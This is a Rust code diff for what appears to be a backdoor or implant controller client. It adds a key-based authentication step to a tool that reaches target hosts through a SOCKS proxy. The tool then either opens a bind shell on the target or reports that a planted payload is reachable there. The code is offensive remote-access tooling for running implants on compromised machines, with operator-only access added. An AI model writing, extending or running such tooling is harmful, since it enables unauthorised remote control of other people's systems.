@@ -2,7 +2,7 @@ mod setting;
 
 extern crate clap;
 
-use std::io::Write;
+use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::{error, io, path, thread, time};
 
@@ -77,17 +77,26 @@ fn main() -> Result<(), Box<dyn error::Error>> {
                     if target_id < settings.len() {
                         let target = &settings[target_id];
 
-                        if let Ok(stream) = connect_to(&target, socks_address) {
-                            if target.uses_payload {
-                                println!(
-                                    "Your payload should be accessible now at: {}:80",
-                                    target.address
-                                );
-                            } else {
-                                bind_shell(stream).unwrap_or_else(|_| {
-                                    //
-                                });
-                                println!("connection closed.");
+                        if let Ok(mut stream) = connect_to(&target, socks_address) {
+                            match authenticate(&mut stream, &target) {
+                                Ok(succeeded) => {
+                                    if succeeded {
+                                        if target.uses_payload {
+                                            println!(
+                                                "Your payload should be accessible now at: {}:PAYLOAD_PORT",
+                                                target.address
+                                            );
+                                        } else {
+                                            bind_shell(stream).unwrap_or_else(|_| {
+                                                //
+                                            });
+                                            println!("connection closed.");
+                                        }
+                                    } else {
+                                        println!("you are not authenticated to this host");
+                                    }
+                                },
+                                Err(err) => println!("problem authenticating: {:?}", err)
                             }
                         };
                     } else {
@@ -133,6 +142,28 @@ fn connect_to(
     }
 
     Err(format!("problem connecting to host: {:?}", &setting.address).into())
+}
+
+fn authenticate(
+    stream: &mut TcpStream,
+    setting: &setting::Setting
+) -> Result<bool, Box<dyn error::Error>> {
+    let buf: Vec<u8> = setting.key.chars().map(|c| c as u8).collect();
+
+    if let Err(err) = stream.write(&buf) {
+        return Err(err.into());
+    }
+
+    if let Err(err) = stream.flush() {
+        return Err(err.into());
+    }
+
+    let mut reply = [0];
+    if let Err(err) = stream.read_exact(&mut reply) {
+        return Err(err.into());
+    }
+
+    Ok(reply[0] == 1)
 }
 
 fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
